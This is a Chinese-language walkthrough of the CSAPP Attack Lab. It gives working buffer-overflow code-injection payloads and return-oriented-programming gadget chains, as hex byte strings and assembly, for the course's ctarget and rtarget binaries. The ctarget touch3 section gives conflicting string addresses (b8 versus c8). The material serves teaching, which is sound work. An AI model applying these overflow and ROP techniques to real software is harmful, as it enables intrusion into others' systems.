# CSAPP Lab3 AttackLab
## ~~写在前面：~~
### ~~一定要读pdf！！！pdf，你看起来是多么的顺眼（~~

## 真正的写在前面：
通过读pdf，我们发现我们需要通过test函数中调用的getbuf函数对程序发动攻击，需要注意的就只有getbuf开了40字节的栈帧，以此为基础我们才可以继续后续的攻击

## 解题思路

## ctarget

### ctarget -> touch1
```C
1 void touch1()
2 {
3     vlevel = 1; /* Part of validation protocol */
4     printf("Touch1!: You called touch1()\n");
5     validate(1);
6     exit(0);
7 }
```
touch1是练手题，只需要通过覆盖getbuf的返回地址来调用touch1就算成功

使用vim查看ctarget的反汇编，使用`/`搜索`touch1`，容易发现touch1的地址是`0x401895`，所以我们只需要随意输入40个字符，然后再输入touch1的地址来覆盖getbuf的返回地址即可

**注意该机器采用`little endian`，注意地址在栈中的排列顺序，高位在高地址，低位在低地址，写栈帧从低地址向高地址**

一种可行答案：
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
95 18 40 00 00 00 00 00
```

### ctarget -> touch2

```C
1 void touch2(unsigned val)
2 {
3     vlevel = 2; /* Part of validation protocol */
4     if (val == cookie) {
5         printf("Touch2!: You called touch2(0x%.8x)\n", val);
6         validate(2);
7     } 
      else {
8     printf("Misfire: You called touch2(0x%.8x)\n", val);
9     fail(2);
10    }
11    exit(0);
12 }
```
通过touch2的C代码，我们发现这次我们不仅需要攻击调用touch2，还要传入一个正确的参数，通过汇编找到该参数，此为`bomblab`的内容，不再赘述，得到该值为cookie：0x3661a994

只有传入的参数等于cookie时，我们才能成功，否则会`misfire`

因此这次我们需要在栈帧中写入一些代码，以此让存放第一个参数的寄存器`%rdi`的值为`0x3661a994`

因为`ctarget`没有栈保护机制，因此栈顶的位置固定，所以我们直接在栈顶写入我们想要的代码即可

现在.s文件中写下以下汇编代码：
```
movq $0x3661a994, %rdi
pushq $0x4018c1
retq
```
使用`gcc -c`指令对其进行编译，再对得到的.o文件使用`objdump -d`指令反汇编，查看上述指令的机器指令
```
   0:   48 c7 c7 94 a9 61 36    mov    $0x3661a994,%rdi
   7:   68 c1 18 40 00          pushq  $0x4018c1
   c:   c3                      retq
```
这里稍做解释，我们通过覆盖getbuf的返回地址让其运行栈顶处的指令，接下来为了调用touch2，我们使用push+ret组合指令，以此调用touch2（这也是pdf里推荐的方法）

故我们可以得到一个touch2的可行答案为：
```
48 c7 c7 94 a9 61 36 68 
c1 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
88 00 64 55 00 00 00 00
```

### ctarget -> touch3
```C
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4     char cbuf[110];
5     /* Make position of check string unpredictable */
6     char *s = cbuf + random() % 100;
7     sprintf(s, "%.8x", val);
8     return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13     vlevel = 3; /* Part of validation protocol */
14     if (hexmatch(cookie, sval)) {
15     printf("Touch3!: You called touch3(\"%s\")\n", sval);
16     validate(3);
17 } else {
18     printf("Misfire: You called touch3(\"%s\")\n", sval);
19     fail(3);
20 }
21     exit(0);
22 }
```
通过touch3的C代码，不难看出，这次我们的任务是写入一个字符串，然后把它作为第一个参数存放在`%rdi`中，再调用函数`touch3`

不同的是，通过touch3调用的`hexmatch`函数代码，可以发现它使用了随机数，将cookie的字符串存在其栈帧中的随机位置，也就是说，如果我们将要传入的字符串写在getbuf的栈帧之下，就会有很大的可能被hexmatch的操作覆盖掉，导致失败

所以我们就将该字符串放在getbuf之上，也就是return address之上

通过gdb，找到test栈帧的位置，同上，为`bomblab`基本操作，此处省略，可以得知我们将要写入字符串的首地址是`0x556400b8`

因此，我们要写入的汇编代码为：
```
mov $0x556400c8, %rdi
pushq $0x4019cf
retq
```
反汇编后得到机器指令：
```
0:   48 c7 c7 c8 00 64 55    mov    $0x556400c8,%rdi
7:   68 cf 19 40 00          pushq  $0x4019cf
c:   c3                      retq
```
再通过ASCII表，得到cookie的字符串为`33 36 36 31 61 39 39 34 00`，注意最后的00，C语言字符串以`\0`结尾

这里我们仍然先返回到栈中的代码，本题其中一种可行答案为：
```
48 c7 c7 b8 00 64 55 68 
cf 19 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
88 00 64 55 00 00 00 00 
33 36 36 31 61 39 39 34 00
```

## rtarget

rtarget要做到的事情与ctarget中touch2和touch3完全一致，但是rtarget中对栈进行了保护

一是随机栈，即每次运行使用的地址空间不同，也就是说我们无法通过绝对寻址找到栈中的某一确定位置了

二是将内存中的栈标记为不可执行，也就是说即使我们成功跳转到了我们想要的栈中指令位置，栈中的指令也不能正常运行

难道这样我们就没有办法了吗？（没有canary什么都好说）

其实还是有的，也就是所谓的ROP: Return-Oriented Programming

虽然我们不能写代码了~~（还有这种好事？）~~，但是我们可以通过调用程序中原有的机器指令来达到我们的目的，注意这个过程并不一定可以一次完成，因为不是每次都刚好有我们想要的指令

**划重点**

**不是一定要从头调用原有的指令的，一定要懂得“断章取义”，这是这个方法最精髓的地方，也是为什么程序频频出现漏洞的原因**

CSAPP非常友好，不需要我们去各个地方奔波找到想要的机器指令，只需要在他划定的farm中寻找就好了

### rtarget -> touch2
```C
1 void touch2(unsigned val)
2 {
3     vlevel = 2; /* Part of validation protocol */
4     if (val == cookie) {
5         printf("Touch2!: You called touch2(0x%.8x)\n", val);
6         validate(2);
7     } 
      else {
8     printf("Misfire: You called touch2(0x%.8x)\n", val);
9     fail(2);
10    }
11    exit(0);
12 }
```
回顾一下，我们要将cookie放入`%rdi`并调用touch2函数

想在源代码中找到`mov`一个指定立即数到指定寄存器中的指令基本(ぜんぜん)不可能

那又没办法了吗？（没有canary真不错）

注意到这里对栈的保护措施只是不允许执行栈中内容，但是我们仍然可以读取栈中的内容，所以我们只需要将cookie的值写入栈中，再通过调用pop指令将其放入某个寄存器中（当然不一定是`%rdi`）

于是我们使用无敌的vim，在farm的区域中搜索关键字`5`，不难发现`start_farm`之下就有一个`58 90 c3`，其对应
```
popq %rax
nop
ret
```
记录下它的首地址：`0x401a77`

继续使用万能的vim，搜索`48 89 c7`，发现刚好有一个`48 89 c7 c3`，其对应
```
movq %rax, %rdi
ret
```
记录首地址：`0x401a83`

因此我们需要做的就是在getbuf的return address写上第一个gadget的地址，接着写入cookie的值，再写入第二个gadget的地址，最后写入touch2的地址

一种可行答案为：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
77 1a 40 00 00 00 00 00
94 a9 61 36 00 00 00 00
83 1a 40 00 00 00 00 00
c1 18 40 00 00 00 00 00
```

### rtarget -> touch3
```C
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4     char cbuf[110];
5     /* Make position of check string unpredictable */
6     char *s = cbuf + random() % 100;
7     sprintf(s, "%.8x", val);
8     return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13     vlevel = 3; /* Part of validation protocol */
14     if (hexmatch(cookie, sval)) {
15     printf("Touch3!: You called touch3(\"%s\")\n", sval);
16     validate(3);
17 } else {
18     printf("Misfire: You called touch3(\"%s\")\n", sval);
19     fail(3);
20 }
21     exit(0);
22 }
```
CMU官方劝退，所以就看了看，目标还是写入字符串并将其首地址传入`%rdi`

因为采用了随机栈，所以我们不能通过绝对寻址找到我们写入字符串的首地址，但是CMU告诉你要用到`lea(%rdi, %rsi, 1), %rax`，这就提示我们，要将初始运行时的栈顶位置储存，通过固定数量的操作后，写上字符串，再这个固定数量的操作中，我们要让存储的`%rsp`加上操作占用的栈帧，再将它放入`%rdi`中，这样就实现了对字符串首地址的相对寻址

具体在farm中寻找代码的过程较为繁琐，也可能出现因为找不到某一指令导致要全部重来的情况，所以CMU也建议没病别做

为了再降低难度，CMU好心的告诉了我们官方答案中使用了8个gadget

以下省略漫长的寻找过程，给出我找到的一种解法(下方模拟栈帧）：

栈顶
```
0x401acf mov %rsp, %rax
0x401a89 mov %rax, %rdi
0x401a77 popq %rax
0x48
0x401aad mov %eax, %ecx              //部分指令可能不是纯粹的该操作，但多余操作保证不影响到我们要使用的寄存器就行
0x401b34 mov %ecx, %edx
0x401b43 mov %edx, %esi
0x401aa7 lea(%rdi, %rsi, 1), %rax
0x401a89 mov %rax, %rdi
0x4019cf <touch3>
33 36 36 31 61 39 39 34 00
```
栈底

因此我们得到该题的一种答案为：
```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
cf 1a 40 00 00 00 00 00
89 1a 40 00 00 00 00 00
77 1a 40 00 00 00 00 00
48 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00
34 1b 40 00 00 00 00 00
43 1b 40 00 00 00 00 00
a7 1a 40 00 00 00 00 00
89 1a 40 00 00 00 00 00
cf 19 40 00 00 00 00 00
33 36 36 31 61 39 39 34 00
```
